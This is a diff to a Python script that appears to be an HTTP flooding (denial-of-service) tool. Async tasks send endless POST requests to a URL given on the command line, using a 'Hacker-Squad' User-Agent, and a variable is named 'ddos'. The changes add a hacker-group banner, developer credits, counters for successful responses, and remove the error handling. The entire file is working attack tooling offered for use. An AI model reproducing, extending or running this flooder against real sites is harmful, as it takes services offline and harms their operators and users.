@@ -2,39 +2,53 @@ import aiohttp
 import asyncio
 import threading
 import subprocess
+import multiprocess
 import sys
 import time
+import colorama
 
 ths = []
-
+r = 0
+num = 0
 headers = {
   "User-Agent": "Hacker-Squad/6.6.6"
 }
 
-start = int(time.time())
-try:
-  url = sys.argv[1]
-except:
+print(colorama.Fore.RED + """
+ .___                              .___    ___ 
+ /   \\   ___  , __   , __     ___  /   `  /   \\
+ |__-' .'   ` |'  `. |'  `. .'   ` |    |   _-'
+ |  \\  |----' |    | |    | |----' |    |  /   
+ /   \\ `.___, /    | /    | `.___, /---/  /___,
+""")
+
+print(colorama.Fore.BLUE + "Developer : xRennegade \nHackerSquad : https://discord.gg/cobain \nFer te amo <3\n")
+
+if len(sys.argv) < 2:
   print("Debes escribir una url!")
+  exit(-1)
+else:
+  url = sys.argv[1]
   
-num = 0
 reqs = []
 loop = asyncio.new_event_loop()
 
+
 async def fetch(session, url):
-  try:
+    global r, reqs
+    start = int(time.time())
     while True:
       async with session.post(url, headers=headers) as response:
         if response:
           end = int(time.time())
           final = start - end
           finnal = str(final).replace("-", "")
+          if response.status == 200:
+            r += 1
           reqs.append(response.status)
-          sys.stdout.write(f"Requests : {str(len(reqs))} | Threads : {str(len(ths))} | Time : {finnal}\r")
+          sys.stdout.write(f"Requests : {str(len(reqs))} | Threads : {str(len(ths))} | Time : {finnal} | Status 200: {str(r)} | Response Status Code => {str(response.status)}\r")
         else:
-          print("No response, exiting...")
-  except:
-    pass
+          print("No hay respuesta :c")
 
 
 
@@ -49,10 +63,7 @@ async def main():
     ddos = await asyncio.gather(*tasks)
 
 def run():
-  try:
     loop.run_forever(asyncio.run(main()))
-  except:
-    pass
 
 
 if __name__ == '__main__':
